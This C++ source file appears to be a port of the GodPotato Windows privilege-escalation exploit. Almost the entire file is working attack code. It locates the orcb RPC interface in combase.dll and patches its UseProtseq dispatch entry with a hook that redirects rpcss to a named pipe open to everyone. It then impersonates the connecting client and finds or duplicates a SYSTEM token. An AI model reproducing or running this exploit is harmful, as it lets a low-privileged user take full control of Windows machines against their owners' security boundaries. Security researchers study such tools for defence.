#include "ctx.h"

#include <psapi.h>
#include <sddl.h>

#include <cstring>

#include "token.h"

namespace {

const char* kClientPipe = "ncacn_np:localhost/pipe/GodPotato[\\pipe\\epmapper]";
const wchar_t* kServerPipe = L"\\\\.\\pipe\\GodPotato\\pipe\\epmapper";

// IObjectExporter / orcb RPC interface id.
const uint8_t kOrcbRpcGuid[16] = {
    0x70, 0x07, 0xf7, 0x18,
    0x64, 0x8e,
    0xcf, 0x11,
    0x9a, 0xf1, 0x00, 0x20, 0xaf, 0x6e, 0x72, 0xf4,
};

volatile LONG g_useProtseqParamCount = 6;

// The payload returned to rpcss through the hooked UseProtseq routine: a
// DUALSTRINGARRAY advertising our named pipe (same layout the C# version writes).
void* BuildPipeDsa() {
    const char* endpoints[] = {kClientPipe, "ncacn_ip_tcp:fuck you !"};

    int entries = 3;
    for (const char* endpoint : endpoints) {
        entries += static_cast<int>(strlen(endpoint)) + 1;
    }
    int memorySize = entries * 2 + 10;

    uint8_t* buffer = static_cast<uint8_t*>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, memorySize));
    if (!buffer) return nullptr;

    int offset = 0;
    *reinterpret_cast<int16_t*>(buffer + offset) = static_cast<int16_t>(entries);
    offset += 2;
    *reinterpret_cast<int16_t*>(buffer + offset) = static_cast<int16_t>(entries - 2);
    offset += 2;

    for (const char* endpoint : endpoints) {
        for (const char* p = endpoint; *p; ++p) {
            *reinterpret_cast<int16_t*>(buffer + offset) = static_cast<int16_t>(static_cast<unsigned char>(*p));
            offset += 2;
        }
        offset += 2;  // NUL terminator already zeroed
    }
    return buffer;
}

// Dispatch table entry 0 of the orcb server interface (UseProtseq). The real
// routine takes `paramCount` arguments and receives the new DSA through its
// second-to-last parameter; x64 passes arguments 5..N on the stack, so a
// 14-parameter prototype reads the right slot for every supported count.
int __stdcall UseProtseqHook(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5,
                             void* p6, void* p7, void* p8, void* p9, void* p10, void* p11,
                             void* p12, void* p13) {
    void* args[14] = {p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13};
    int index = static_cast<int>(g_useProtseqParamCount) - 2;
    if (index < 0 || index >= 14) return 0;

    void** target = reinterpret_cast<void**>(args[index]);
    if (target) {
        *target = BuildPipeDsa();
    }
    return 0;
}

const char* ImpersonationName(SECURITY_IMPERSONATION_LEVEL level) {
    switch (level) {
        case SecurityAnonymous: return "Anonymous";
        case SecurityIdentification: return "Identification";
        case SecurityImpersonation: return "Impersonation";
        case SecurityDelegation: return "Delegation";
        default: return "None";
    }
}

}  // namespace

GodPotatoContext::~GodPotatoContext() {
    Stop();
}

bool GodPotatoContext::Init() {
    LoadLibraryW(L"combase.dll");
    HMODULE module = GetModuleHandleW(L"combase.dll");
    if (!module) {
        gpLog("[!] No combase module found");
        return false;
    }
    combaseModule_ = reinterpret_cast<uintptr_t>(module);

    MODULEINFO info{};
    if (!GetModuleInformation(GetCurrentProcess(), module, &info, sizeof(info)) || !info.SizeOfImage) {
        gpLog("[!] GetModuleInformation(combase.dll) failed, Win32Error:%lu", GetLastError());
        return false;
    }
    moduleSize_ = info.SizeOfImage;

    std::vector<uint8_t> image(moduleSize_);
    memcpy(image.data(), module, moduleSize_);

    for (size_t i = 0; i + 20 <= moduleSize_; ++i) {
        uint32_t structSize = 0;
        memcpy(&structSize, image.data() + i, sizeof(structSize));
        // x64 builds of combase use 96 (8-byte aligned); some builds pack the
        // structure to 4 bytes (84). Support both.
        if (structSize != 84 && structSize != 96) continue;
        if (memcmp(image.data() + i + 4, kOrcbRpcGuid, sizeof(kOrcbRpcGuid)) != 0) continue;

        bool packed4 = (structSize == 84);
        uintptr_t base = combaseModule_ + i;
        void* dispatch = *reinterpret_cast<void**>(base + (packed4 ? 44 : 48));
        void* interpreter = *reinterpret_cast<void**>(base + (packed4 ? 72 : 80));
        if (!dispatch || !interpreter) continue;

        auto withinModule = [this](void* p) {
            uintptr_t v = reinterpret_cast<uintptr_t>(p);
            return v >= combaseModule_ && v < combaseModule_ + moduleSize_;
        };
        if (!withinModule(dispatch) || !withinModule(interpreter)) continue;

        void* midlDispatch = *reinterpret_cast<void**>(reinterpret_cast<uint8_t*>(interpreter) + 8);
        void* procString = *reinterpret_cast<void**>(reinterpret_cast<uint8_t*>(interpreter) + 16);
        void* formatOffsets = *reinterpret_cast<void**>(reinterpret_cast<uint8_t*>(interpreter) + 24);
        if (!withinModule(midlDispatch) || !withinModule(procString) || !withinModule(formatOffsets)) {
            continue;
        }

        int16_t firstFormatOffset = *reinterpret_cast<int16_t*>(formatOffsets);
        if (firstFormatOffset < 0) continue;

        uint8_t paramCount = *reinterpret_cast<uint8_t*>(reinterpret_cast<uint8_t*>(procString) +
                                                        firstFormatOffset + 19);
        if (paramCount < 4 || paramCount > 14) continue;

        dispatchTablePtr_ = midlDispatch;
        originalUseProtseq_ = *reinterpret_cast<void**>(midlDispatch);
        paramCount_ = paramCount;
        return true;
    }

    gpLog("[!] Cannot find the orcb RPC_SERVER_INTERFACE in combase.dll");
    return false;
}

void GodPotatoContext::HookRPC() {
    if (!dispatchTablePtr_ || !originalUseProtseq_) return;

    DWORD oldProtect = 0;
    if (!VirtualProtect(dispatchTablePtr_, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        gpLog("[!] VirtualProtect(dispatch table) failed, Win32Error:%lu", GetLastError());
        return;
    }
    g_useProtseqParamCount = static_cast<LONG>(paramCount_);
    *reinterpret_cast<void**>(dispatchTablePtr_) = reinterpret_cast<void*>(&UseProtseqHook);
    VirtualProtect(dispatchTablePtr_, sizeof(void*), oldProtect, &oldProtect);
    isHook_ = true;
}

void GodPotatoContext::Restore() {
    if (!isHook_ || !dispatchTablePtr_ || !originalUseProtseq_) return;

    DWORD oldProtect = 0;
    if (VirtualProtect(dispatchTablePtr_, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        *reinterpret_cast<void**>(dispatchTablePtr_) = originalUseProtseq_;
        VirtualProtect(dispatchTablePtr_, sizeof(void*), oldProtect, &oldProtect);
    }
    isHook_ = false;
}

bool GodPotatoContext::Start() {
    if (!isHook_ || isStart_) {
        gpLog("[!] Context not hooked, cannot start the pipe server");
        return false;
    }

    tokenEvent_ = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (!tokenEvent_) {
        gpLog("[!] CreateEvent failed, Win32Error:%lu", GetLastError());
        return false;
    }

    isStart_ = true;
    pipeThread_ = CreateThread(nullptr, 0, &GodPotatoContext::PipeThreadProc, this, 0, nullptr);
    if (!pipeThread_) {
        isStart_ = false;
        gpLog("[!] CreateThread(pipe server) failed, Win32Error:%lu", GetLastError());
        return false;
    }
    return true;
}

void GodPotatoContext::PublishToken(HANDLE token) {
    token_ = token;
    if (tokenEvent_) SetEvent(tokenEvent_);
}

HANDLE GodPotatoContext::WaitToken(DWORD timeoutMs) {
    if (!tokenEvent_) return nullptr;
    WaitForSingleObject(tokenEvent_, timeoutMs);
    HANDLE token = token_;
    token_ = nullptr;
    return token;
}

void GodPotatoContext::Stop() {
    if (!isStart_) return;
    isStart_ = false;

    // Unblock ConnectNamedPipe if it is still waiting.
    HANDLE client = CreateFileW(kServerPipe, GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (client != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        WriteFile(client, "\xaa", 1, &written, nullptr);
        CloseHandle(client);
    }

    if (pipeThread_) {
        WaitForSingleObject(pipeThread_, 5000);
        CloseHandle(pipeThread_);
        pipeThread_ = nullptr;
    }
    if (pipeHandle_ != INVALID_HANDLE_VALUE) {
        CloseHandle(pipeHandle_);
        pipeHandle_ = INVALID_HANDLE_VALUE;
    }
    if (tokenEvent_) {
        CloseHandle(tokenEvent_);
        tokenEvent_ = nullptr;
    }
    if (token_) {
        CloseHandle(token_);
        token_ = nullptr;
    }
}

DWORD WINAPI GodPotatoContext::PipeThreadProc(LPVOID param) {
    auto* self = static_cast<GodPotatoContext*>(param);

    PSECURITY_DESCRIPTOR securityDescriptor = nullptr;
    ULONG descriptorSize = 0;
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1,
                                                              &securityDescriptor, &descriptorSize)) {
        gpLog("[!] ConvertStringSecurityDescriptorToSecurityDescriptor failed, Win32Error:%lu", GetLastError());
        self->PublishToken(nullptr);
        return 0;
    }

    SECURITY_ATTRIBUTES attributes{};
    attributes.nLength = sizeof(attributes);
    attributes.lpSecurityDescriptor = securityDescriptor;
    attributes.bInheritHandle = FALSE;

    HANDLE pipe = CreateNamedPipeW(kServerPipe, PIPE_ACCESS_DUPLEX,
                                   PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                                   PIPE_UNLIMITED_INSTANCES, 521, 0, 123, &attributes);
    LocalFree(securityDescriptor);

    gpLog("[*] CreateNamedPipe %ls", kServerPipe);
    if (pipe == INVALID_HANDLE_VALUE) {
        gpLog("[!] CreateNamedPipe failed, Win32Error:%lu", GetLastError());
        self->PublishToken(nullptr);
        return 0;
    }
    self->pipeHandle_ = pipe;

    BOOL connected = ConnectNamedPipe(pipe, nullptr);
    DWORD connectError = connected ? ERROR_SUCCESS : GetLastError();
    if (!connected && connectError != ERROR_PIPE_CONNECTED) {
        if (self->isStart_) gpLog("[!] ConnectNamedPipe failed, Win32Error:%lu", connectError);
        self->PublishToken(nullptr);
        CloseHandle(pipe);
        if (self->pipeHandle_ == pipe) self->pipeHandle_ = INVALID_HANDLE_VALUE;
        return 0;
    }

    if (self->isStart_) {
        gpLog("[*] Pipe Connected!");
        if (ImpersonateNamedPipeClient(pipe)) {
            HANDLE threadToken = nullptr;
            SECURITY_IMPERSONATION_LEVEL level = SecurityAnonymous;
            bool haveToken = OpenThreadToken(GetCurrentThread(),
                                             TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE |
                                                 TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT |
                                                 TOKEN_ADJUST_SESSIONID,
                                             TRUE, &threadToken) != FALSE;
            if (haveToken) {
                TokenGetImpersonationLevel(threadToken, level);
                std::wstring user;
                if (TokenUserName(threadToken, user)) {
                    gpLog("[*] CurrentUser: %ls", user.c_str());
                }
                gpLog("[*] CurrentsImpersonationLevel: %s", ImpersonationName(level));
            } else {
                gpLog("[!] OpenThreadToken failed, Win32Error:%lu", GetLastError());
            }

            HANDLE systemToken = nullptr;
            if (haveToken && TokenIsSystem(threadToken) && level >= SecurityImpersonation) {
                systemToken = DuplicateSystemTokenAsPrimary(threadToken);
            }
            if (!systemToken && level >= SecurityImpersonation) {
                gpLog("[*] Start Search System Token");
                systemToken = FindSystemToken(threadToken);
            }
            if (systemToken) {
                std::wstring user;
                if (TokenUserName(systemToken, user)) {
                    gpLog("[*] Find System Token : true (%ls)", user.c_str());
                } else {
                    gpLog("[*] Find System Token : true");
                }
                self->PublishToken(systemToken);
            } else {
                gpLog("[*] Find System Token : false");
                self->PublishToken(nullptr);
            }

            if (threadToken) CloseHandle(threadToken);
            RevertToSelf();
        } else {
            gpLog("[!] ImpersonateNamedPipeClient failed, Win32Error:%lu", GetLastError());
            self->PublishToken(nullptr);
        }
    } else {
        self->PublishToken(nullptr);
    }

    CloseHandle(pipe);
    if (self->pipeHandle_ == pipe) self->pipeHandle_ = INVALID_HANDLE_VALUE;
    return 0;
}
